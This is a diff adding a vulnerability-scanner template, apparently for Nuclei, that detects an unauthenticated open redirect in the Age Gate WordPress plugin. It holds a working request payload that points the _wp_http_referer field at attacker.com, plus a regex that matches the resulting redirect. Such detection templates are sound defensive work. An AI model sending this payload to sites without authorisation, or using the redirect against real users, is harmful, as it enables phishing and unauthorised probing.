@@ -1,0 +1,29 @@
+id: age-gate-open-redirect
+
+info:
+  name: Age Gate < 2.13.5 - Unauthenticated Open Redirect
+  author: akincibor
+  severity: low
+  description: The plugin takes the _wp_http_referer parameter to redirect users after some actions as well as after invalid or missing nonces, leading to an Unauthenticated Open Redirect issue.
+  reference:
+    - https://wpscan.com/vulnerability/10489
+    - https://packetstormsecurity.com/files/160236/
+    - https://wordpress.org/plugins/age-gate
+  metadata:
+    verified: true
+  tags: wp-plugin,redirect,wordpress,wp,agegate,unauth
+
+requests:
+  - method: POST
+    path:
+      - '{{BaseURL}}/wp-admin/admin-post.php'
+
+    body: age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&_wp_http_referer=https://attacker.com
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)attacker\.com\/?(\/|[^.].*)?$' # https://regex101.com/r/ZDYhFh/1
